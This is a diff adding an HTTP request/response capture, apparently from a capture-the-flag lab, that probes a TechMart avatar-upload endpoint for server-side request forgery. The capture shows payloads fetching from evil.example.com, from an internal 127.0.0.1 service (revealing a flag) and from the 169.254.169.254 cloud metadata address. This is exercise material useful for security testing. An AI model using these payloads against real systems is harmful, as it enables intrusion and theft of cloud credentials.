@@ -1,0 +1,68 @@
+# Request/Response capture: PUT /api/users/42/avatar
+# Testing avatar upload via URL parameter
+
+# === Request ===
+PUT /api/users/42/avatar HTTP/1.1
+Host: app.techmart.local
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo0Miwicm9sZSI6InVzZXIiLCJleHAiOjE3NDM4MDY0MDB9.fake_signature_here
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="url"
+
+https://evil.example.com/avatar.png
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+# === Response (external URL) ===
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "avatar_url": "/avatars/42-a8f3b2c1.png",
+  "source": "url_fetch",
+  "fetched_from": "https://evil.example.com/avatar.png",
+  "fetch_status": 200,
+  "fetch_content_type": "image/png",
+  "fetch_size": 24576
+}
+
+# === Test: Internal URL (SSRF attempt) ===
+# Request body: {"url": "http://127.0.0.1:8080/api/internal/health"}
+
+PUT /api/users/42/avatar HTTP/1.1
+Host: app.techmart.local
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo0Miwicm9sZSI6InVzZXIiLCJleHAiOjE3NDM4MDY0MDB9.fake_signature_here
+Content-Type: application/json
+
+{"url": "http://127.0.0.1:8080/api/internal/health"}
+
+# === Response (internal URL - NOT BLOCKED!) ===
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "avatar_url": "/avatars/42-d4e5f6a7.png",
+  "source": "url_fetch",
+  "fetched_from": "http://127.0.0.1:8080/api/internal/health",
+  "fetch_status": 200,
+  "fetch_content_type": "application/json",
+  "fetch_size": 512,
+  "flag": "FLAG{ssrf_avatar_bypass}",
+  "warning": "Internal content fetched and saved as avatar - content type mismatch ignored"
+}
+
+# === Test: Cloud metadata (AWS-style) ===
+# Request body: {"url": "http://169.254.169.254/latest/meta-data/"}
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "avatar_url": "/avatars/42-b8c9d0e1.png",
+  "source": "url_fetch",
+  "fetched_from": "http://169.254.169.254/latest/meta-data/",
+  "fetch_status": 200,
+  "fetch_content_type": "text/plain",
+  "fetch_size": 289,
+  "warning": "Content type mismatch ignored"
+}
